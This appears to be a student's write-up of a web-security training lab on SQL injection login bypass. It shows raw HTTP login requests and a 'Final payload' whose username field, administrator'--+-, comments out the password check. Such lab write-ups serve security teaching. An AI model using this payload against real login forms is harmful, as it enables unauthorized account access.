---
tags:
  - sql
  - injection
---
# SQL injection vulnerability allowing login bypass

## Instructions

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator`user.

## Solution

When we first send an invalid password, we get the following error:

```text title="Invalid logon request"
POST /login HTTP/2
Host: 0ab900a10465b08981a5a2c20086002b.web-security-academy.net
Cookie: session=iB1idDnwSqOV70T4DLpWfM68h94zU5E2
Content-Length: 78
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: https://0ab900a10465b08981a5a2c20086002b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab900a10465b08981a5a2c20086002b.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=YvvJHYFQ9kAjzWNBu9gaWBatg2bYar9n&username=administrator&password=password

```

![](attachments/sqli-lab-2/file-20251121082955885.png)

If we just comment out the password field, we can bypass the authentication check and just log in with the username.

```text title="Final payload"
POST /login HTTP/2
Host: 0ab900a10465b08981a5a2c20086002b.web-security-academy.net
Cookie: session=HCToViKrVJ273UADzIXS5QEtpbSU5ovg
Content-Length: 85
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: https://0ab900a10465b08981a5a2c20086002b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab900a10465b08981a5a2c20086002b.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=ftR0shmzbkLwCvuHdiNgunnZso1OGD1X&username=administrator%27--+-&password=password

```


![](attachments/sqli-lab-2/file-20251121082955887.png)

